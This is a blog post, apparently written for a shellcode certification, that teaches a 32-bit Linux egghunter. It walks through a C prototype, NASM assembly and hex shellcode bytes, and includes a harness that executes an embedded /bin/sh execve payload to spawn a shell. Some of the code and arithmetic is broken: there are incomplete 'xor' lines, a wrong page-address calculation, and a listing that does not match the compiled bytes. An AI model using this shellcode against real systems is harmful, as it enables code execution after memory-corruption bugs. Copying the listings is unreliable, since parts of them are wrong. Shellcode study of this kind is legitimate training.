<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Egghunter Linux Shellcode - hackcommander.io</title>
<meta name="description" content="An egghunter can be useful in situations where the buffer space the attacker controls is limited and doesn’t allow for a full shellcode to be placed on the stack. The egghunter acts as a staged payload: the smaller payload which is executed first looks through the entire process memory space for a marker (the egg) indicating the start of the larger payload. Once the egg is found, the stager jumps to the memory address following the egg and executes the shellcode.">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="hackcommander.io">
<meta property="og:title" content="Egghunter Linux Shellcode">
<meta property="og:url" content="http://localhost:4000/egghunter/">


  <meta property="og:description" content="An egghunter can be useful in situations where the buffer space the attacker controls is limited and doesn’t allow for a full shellcode to be placed on the stack. The egghunter acts as a staged payload: the smaller payload which is executed first looks through the entire process memory space for a marker (the egg) indicating the start of the larger payload. Once the egg is found, the stager jumps to the memory address following the egg and executes the shellcode.">



  <meta property="og:image" content="http://localhost:4000/assets/images/slae32.png">





  <meta property="article:published_time" content="2018-11-19T00:00:00+01:00">





  

  


<link rel="canonical" href="http://localhost:4000/egghunter/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "HackCommander",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Posts</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categories</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Tags</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >About</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Egghunter Linux Shellcode</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">HackCommander</h3>
    
    
      <p class="author__bio" itemprop="description">
        Pentester, Bug Bounty Hunter <br>and CTF Player
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
        </li>
      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://www.linkedin.com/in/iván-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
          </a>
        </li>
      

      

      

      

      

      
        <li>
          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Egghunter Linux Shellcode">
    <meta itemprop="description" content="An egghunter can be useful in situations where the buffer space the attacker controls is limited and doesn’t allow for a full shellcode to be placed on the stack. The egghunter acts as a staged payload: the smaller payload which is executed first looks through the entire process memory space for a marker (the egg) indicating the start of the larger payload. Once the egg is found, the stager jumps to the memory address following the egg and executes the shellcode.">
    <meta itemprop="datePublished" content="November 19, 2018">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Egghunter Linux Shellcode
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2018-11-19T00:00:00+01:00">November 19, 2018 </time>&emsp;
          
          
        </p>
        <p>An egghunter can be useful in situations where the buffer space the attacker controls is limited and doesn’t allow for a full shellcode to be placed on the stack. The egghunter acts as a staged payload: the smaller payload which is executed first looks through the entire process memory space for a marker (the egg) indicating the start of the larger payload. Once the egg is found, the stager jumps to the memory address following the egg and executes the shellcode.</p>

<p>There’s a few gotchas though that the egghunter has to watch out for:</p>

<p>The main problem the egghunter has to work around is segfaults when trying to access an area of memory that is not allocated. To prevent this, the <code class="language-plaintext highlighter-rouge">access</code> function is called for each memory page and only if the page can be accessed will the shellcode look for the egg inside it. By default, Linux uses a page size of 4096 bytes so if an <code class="language-plaintext highlighter-rouge">EFAULT</code> is returned after calling <code class="language-plaintext highlighter-rouge">access</code>, we skip to the next page to avoid segfaulting.</p>

<p>The egghunter must also avoid locating itself in memory and jumping to the wrong address.</p>

<p>As shown here in the memory map, the stack is located at a higher address than the <code class="language-plaintext highlighter-rouge">.text</code> segment (0x08048000) so if we look in memory for the egg starting from the lower addresses, we’ll match the string in the egghunter code instead of the egg in front of the 2nd stage shellcode (located on the stack).</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  vmmap
Start      End        Offset     Perm Path
0x08048000 0x08049000 0x00000000 r-x /home/slemire/slae32/assignment3/egghunter_c
0x08049000 0x0804a000 0x00000000 r-x /home/slemire/slae32/assignment3/egghunter_c
0x0804a000 0x0804b000 0x00001000 rwx /home/slemire/slae32/assignment3/egghunter_c
0xb7e19000 0xb7e1a000 0x00000000 rwx 
0xb7e1a000 0xb7fca000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so
0xb7fca000 0xb7fcc000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so
0xb7fcc000 0xb7fcd000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so
0xb7fcd000 0xb7fd0000 0x00000000 rwx 
0xb7fd6000 0xb7fd7000 0x00000000 rwx 
0xb7fd7000 0xb7fda000 0x00000000 r-- [vvar]
0xb7fda000 0xb7fdb000 0x00000000 r-x [vdso]
0xb7fdb000 0xb7ffe000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so
0xb7ffe000 0xb7fff000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so
0xb7fff000 0xb8000000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so
0xbffdf000 0xc0000000 0x00000000 rwx [stack]
</code></pre></div></div>

<p>Let’s say we have an egghunter program that used an egg with the bytes <code class="language-plaintext highlighter-rouge">DEAD</code>. Using <code class="language-plaintext highlighter-rouge">gef</code> for <code class="language-plaintext highlighter-rouge">gdb</code>, if we search for <code class="language-plaintext highlighter-rouge">DEAD</code> in memory we find a copy in the <code class="language-plaintext highlighter-rouge">.text</code> section at address <code class="language-plaintext highlighter-rouge">0x8048531</code> and another one in the stack at address <code class="language-plaintext highlighter-rouge">0xbffff1a8</code>. The 2nd one in the stack is the egg.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Searching 'DEAD' in memory
[+] In '/home/slemire/slae32/assignment3/egghunter_c'(0x8048000-0x8049000), permission=r-x
  0x8048531 - 0x8048535  →   "DEAD[...]" 
  0x804853b - 0x804853f  →   "DEAD[...]" 
  0x8048545 - 0x8048549  →   "DEAD[...]" 
[+] In '/home/slemire/slae32/assignment3/egghunter_c'(0x8049000-0x804a000), permission=r-x
  0x8049531 - 0x8049535  →   "DEAD[...]" 
  0x804953b - 0x804953f  →   "DEAD[...]" 
  0x8049545 - 0x8049549  →   "DEAD[...]" 
[+] In '[stack]'(0xbffdf000-0xc0000000), permission=rwx
  0xbffff1a8 - 0xbffff1ac  →   "DEAD[...]" 
  0xbffff1cc - 0xbffff1d0  →   "DEAD[...]" 
  0xbffff1d0 - 0xbffff1d4  →   "DEAD[...]" 
[...]
gef➤  search-pattern DEADDEAD
[+] Searching 'DEADDEAD' in memory
[+] In '[stack]'(0xbffdf000-0xc0000000), permission=rwx
  0xbffff1cc - 0xbffff1d4  →   "DEADDEAD[...]" 
</code></pre></div></div>

<p>To avoid matching the string in the code itself, the egghunter code will look for the egg repeated twice. If the egg is only found once, the code assumes this is the string from the <code class="language-plaintext highlighter-rouge">.text</code> section, ignores it and keeps searching.</p>

<h3 id="c-prototype">C prototype</h3>
<hr />

<p>To start with, a C prototype was created to experiment with the egghunter concept. In this example, the egg is <code class="language-plaintext highlighter-rouge">DEAD</code> (4 bytes). The code is not optimized for speed and as such will start looking in memory at address <code class="language-plaintext highlighter-rouge">0x0</code>. There are probably better ways to optimize this, like start searching at addresses higher than the <code class="language-plaintext highlighter-rouge">.text</code> section, but these addresses could vary if ASLR is used.</p>

<p>The following code shows the C prototype for the egghunter.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;errno.h&gt;
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
        <span class="kt">char</span> <span class="n">egg</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="s">"DEAD"</span><span class="p">;</span>
        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">1024</span><span class="p">]</span> <span class="o">=</span> <span class="s">"DEADDEAD</span><span class="se">\xeb\x1a\x5e\x31\xdb\x88\x5e\x07\x89\x76\x08\x89\x5e\x0c\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43</span><span class="s">"</span><span class="p">;</span>
        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">addr</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">r</span><span class="p">;</span>

        <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="c1">// Try to read 8 bytes ahead of current memory pointer (8 bytes because the egg will be repeated twice)</span>
                <span class="n">r</span> <span class="o">=</span> <span class="n">access</span><span class="p">(</span><span class="n">addr</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
                <span class="c1">// If we don't get an EFAULT, we'll start checking for the egg</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">errno</span> <span class="o">!=</span> <span class="mi">14</span><span class="p">)</span> <span class="p">{</span>
                        <span class="c1">// Need to check egg twice, so we don't end up matching the egg from our own code</span>
                        <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">egg</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">strncmp</span><span class="p">(</span><span class="n">addr</span><span class="o">+</span><span class="mi">4</span><span class="p">,</span> <span class="n">egg</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                                <span class="kt">char</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
                                <span class="n">memset</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
                                <span class="n">strncpy</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
                                <span class="n">printf</span><span class="p">(</span><span class="s">"Egg found at: %ul %s, jumping to shellcode (8 bytes ahead of egg address)...</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">tmp</span><span class="p">);</span>
                                <span class="c1">// Jump to shellcode</span>
                                <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">addr</span><span class="o">+</span><span class="mi">8</span><span class="p">;</span>
                                <span class="n">ret</span><span class="p">();</span>
                        <span class="p">}</span>
                        <span class="c1">// Egg not found, keep going one byte at a time</span>
                        <span class="n">addr</span><span class="o">++</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                        <span class="c1">// EFAULT on access, skip to next memory page</span>
                        <span class="n">addr</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">+</span> <span class="mi">4095</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Now, it’s time to test the egghunter C prototype. Because the buffer containing the 2nd stage of the shellcode is located on the stack and the egghunter will jump to that memory location once it finds the egg, the <code class="language-plaintext highlighter-rouge">-z execstack</code> argument must be passed to the gcc compiler to make the stack executable otherwise it’ll just segfault after jumping.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>slemire@slae:~/slae32/assignment3$ ./egghunter_c
Egg found at: 3221221888l DEADDEAD, jumping to shellcode (8 bytes ahead of egg address)...
$ id
uid=1000(slemire) gid=1000(slemire) groups=1000(slemire),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
</code></pre></div></div>

<p>Nice, now let’s build the assembly version with NASM.</p>

<h3 id="assembly-version-of-the-egghunter">Assembly version of the egghunter</h3>
<hr />

<p>First, registers are cleared and the egg is moved in <code class="language-plaintext highlighter-rouge">$esi</code>. We’ll use that register later when we compare memory content against the egg.</p>

<p>The <code class="language-plaintext highlighter-rouge">mul ecx</code> instruction is a little trick to reduce shellcode size: It multiplies <code class="language-plaintext highlighter-rouge">$eax</code> by <code class="language-plaintext highlighter-rouge">$ecx</code> (which was already zeroed out with the <code class="language-plaintext highlighter-rouge">xor</code> instruction), and the results are stored in both <code class="language-plaintext highlighter-rouge">$eax</code> and <code class="language-plaintext highlighter-rouge">$edx</code>. So basically with a single instruction, we can null out both <code class="language-plaintext highlighter-rouge">$eax</code> and <code class="language-plaintext highlighter-rouge">$edx</code>.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">; Zero registers</span>
    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
    <span class="nf">xor</span> 
    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>            <span class="c1">; ecx = 0</span>
    <span class="nf">mul</span> <span class="nb">ecx</span>                 <span class="c1">; eax = 0, edx = 0</span>
    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="mh">0xdeadbeef</span>     <span class="c1">; our egg: 0xDEADBEEF</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">$edx</code> register is used to keep track of the memory address being read. To check is memory is accessible, <code class="language-plaintext highlighter-rouge">access</code> is used at follows:</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">; check if we can read the memory</span>
    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x21</span>            <span class="c1">; sys_access</span>
    <span class="nf">lea</span> <span class="nb">ebx</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span>        <span class="c1">; const char __user *filename</span>
    <span class="nf">int</span> <span class="mh">0x80</span>                <span class="c1">; sys_access</span>
    <span class="nf">cmp</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0xf2</span>            <span class="c1">; Check if we have an EFAULT</span>
    <span class="nf">jz</span> <span class="nv">next_page</span>            <span class="c1">; jump to next page if a fault is raised</span>
</code></pre></div></div>

<p>If we get an <code class="language-plaintext highlighter-rouge">EFAULT</code>, we need to move to the next memory page (4096 bytes ahead), otherwise the code would run a lot more slowly since we know all 4096 bytes in the current memory page with also generate an <code class="language-plaintext highlighter-rouge">EFAULT</code>. To optimize the process, the current address is XORed with <code class="language-plaintext highlighter-rouge">4095</code> so the next loop iteration that increases the <code class="language-plaintext highlighter-rouge">$edx</code> register by 1 will end up in the next memory page.</p>

<p>For example, if we just got a fault reading address <code class="language-plaintext highlighter-rouge">0xb7e19000</code>, XORing the address with <code class="language-plaintext highlighter-rouge">0xfff</code> results in <code class="language-plaintext highlighter-rouge">0xb7e19fff</code>. Then <code class="language-plaintext highlighter-rouge">0xb7e19fff</code> + 1 = <code class="language-plaintext highlighter-rouge">0xb7e18000</code> (start of the next page).</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nl">next_page:</span>
    <span class="nf">or</span> <span class="nb">dx</span><span class="p">,</span> <span class="mh">0xfff</span>            <span class="c1">; align page </span>

    <span class="nl">next_byte:</span>
    <span class="nf">inc</span> <span class="nb">edx</span>                 <span class="c1">; set address to beginning of the memory page</span>
</code></pre></div></div>

<p>If there’s no fault resulting from <code class="language-plaintext highlighter-rouge">access</code>, we can safely looks through the page one byte at a time. We can use the <code class="language-plaintext highlighter-rouge">cmp</code> instruction using the current <code class="language-plaintext highlighter-rouge">$edx</code> value against the <code class="language-plaintext highlighter-rouge">$esi</code> register that contains the egg value. We also need to repeat the comparison a 2nd time to avoid matching the egg value from the code itself as explained earlier. If the egg is matched, the memory address following the 2nd copy of the egg is copied into <code class="language-plaintext highlighter-rouge">$esi</code> and the code jumps to it, executing the 2nd shellcode located there.</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">; search for the egg</span>
    <span class="nf">cmp</span> <span class="p">[</span><span class="nb">edx</span><span class="p">],</span> <span class="nb">esi</span>
    <span class="nf">jnz</span> <span class="nv">next_byte</span>

    <span class="c1">; search again for 2nd copy of the egg (avoid matching code itself)</span>
    <span class="nf">cmp</span> <span class="p">[</span><span class="nb">edx</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="nb">esi</span>
    <span class="nf">jnz</span> <span class="nv">next_byte</span>

    <span class="c1">; egg found, jump to shellcode</span>
    <span class="nf">lea</span> <span class="nb">esi</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span> <span class="o">+</span> <span class="mi">8</span><span class="p">]</span>
    <span class="nf">jmp</span> <span class="nb">esi</span>
</code></pre></div></div>

<p>The final version of the egghunter code is shown below:</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">global</span> <span class="nv">_start</span>

<span class="nf">section</span> <span class="nv">.text</span>

<span class="nl">_start:</span>

    <span class="c1">; Zero registers</span>
    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
    <span class="nf">xor</span> 
    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>            <span class="c1">; ecx = 0</span>
    <span class="nf">mul</span> <span class="nb">ecx</span>                 <span class="c1">; eax = 0, edx = 0</span>
    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="mh">0xdeadbeef</span>     <span class="c1">; our egg: 0xDEADBEEF</span>

    <span class="nl">next_page:</span>
    <span class="nf">or</span> <span class="nb">dx</span><span class="p">,</span> <span class="mh">0xfff</span>            <span class="c1">; align page </span>

    <span class="nl">next_byte:</span>
    <span class="nf">inc</span> <span class="nb">edx</span>                 <span class="c1">; set address to beginning of the memory page</span>

    <span class="c1">; check if we can read the memory</span>
    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x21</span>            <span class="c1">; sys_access</span>
    <span class="nf">lea</span> <span class="nb">ebx</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span>        <span class="c1">; const char __user *filename</span>
    <span class="nf">int</span> <span class="mh">0x80</span>                <span class="c1">; sys_access</span>
    <span class="nf">cmp</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0xf2</span>            <span class="c1">; Check if we have an EFAULT</span>
    <span class="nf">jz</span> <span class="nv">next_page</span>            <span class="c1">; jump to next page if a fault is raised</span>

    <span class="c1">; search for the egg</span>
    <span class="nf">cmp</span> <span class="p">[</span><span class="nb">edx</span><span class="p">],</span> <span class="nb">esi</span>
    <span class="nf">jnz</span> <span class="nv">next_byte</span>

    <span class="c1">; search again for 2nd copy of the egg (avoid matching code itself)</span>
    <span class="nf">cmp</span> <span class="p">[</span><span class="nb">edx</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="nb">esi</span>
    <span class="nf">jnz</span> <span class="nv">next_byte</span>

    <span class="c1">; egg found, jump to shellcode</span>
    <span class="nf">lea</span> <span class="nb">esi</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span> <span class="o">+</span> <span class="mi">8</span><span class="p">]</span>
    <span class="nf">jmp</span> <span class="nb">esi</span>
</code></pre></div></div>

<p>Compiling the shellcode with NASM:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>slemire@slae:~/slae32/assignment3$ ../compile.sh egghunter
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Shellcode: \x31\xc9\xf7\xe1\xbe\xef\xbe\xad\xde\x66\x81\xca\xff\x0f\x42\x31\xc0\xb0\x21\x8d\x5a\x08\xcd\x80\x3c\xf2\x74\xed\x39\x32\x75\xee\x39\x72\x04\x75\xe9\x8d\x72\x08\xff\xe6
[+] Length: 42
[+] Done!
</code></pre></div></div>

<p>To test the egghunter shellcode, a skeleton C program is used. The <code class="language-plaintext highlighter-rouge">buffer</code> array contains a simple execve shellcode prepended by two copies of the egg <code class="language-plaintext highlighter-rouge">0xdeadbeef</code> (in little-endian format).</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
</span>
<span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">1024</span><span class="p">]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xef\xbe\xad\xde\xef\xbe\xad\xde\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80</span><span class="s">"</span><span class="p">;</span>
<span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x31\xc9\xf7\xe1\xbe\xef\xbe\xad\xde\x66\x81\xca\xff\x0f\x42\x31\xc0\xb0\x21\x8d\x5a\x08\xcd\x80\x3c\xf2\x74\xed\x39\x32\x75\xee\x39\x72\x04\x75\xe9\x8d\x72\x08\xff\xe6</span><span class="s">"</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
        <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">shellcode</span><span class="p">;</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Size: %d bytes.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span> 
        <span class="n">ret</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The following output shows that the shellcode works as intended and is able to locate the egg and execute the 2nd stage payload.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>slemire@slae:~/slae32/assignment3$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
slemire@slae:~/slae32/assignment3$ ./shellcode
Size: 43 bytes.
$ id
uid=1000(slemire) gid=1000(slemire) groups=1000(slemire),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
</code></pre></div></div>

<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</p>

<p><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p>

<p>Student ID: SLAE-1236</p>

<p>All source files can be found on GitHub at <a href="https://github.com/slemire/slae32">https://github.com/slemire/slae32</a></p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#assembly" class="page__taxonomy-item" rel="tag">assembly</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#egghunter" class="page__taxonomy-item" rel="tag">egghunter</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#slae" class="page__taxonomy-item" rel="tag">slae</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#slae" class="page__taxonomy-item" rel="tag">slae</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2018-11-19T00:00:00+01:00">November 19, 2018</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/tcp-reverse_shellcode/" class="pagination--pager" title="TCP reverse shellcode
">Previous</a>
    
    
      <a href="/custom-encoder/" class="pagination--pager" title="Custom shellcode encoder
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2022 HackCommander</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
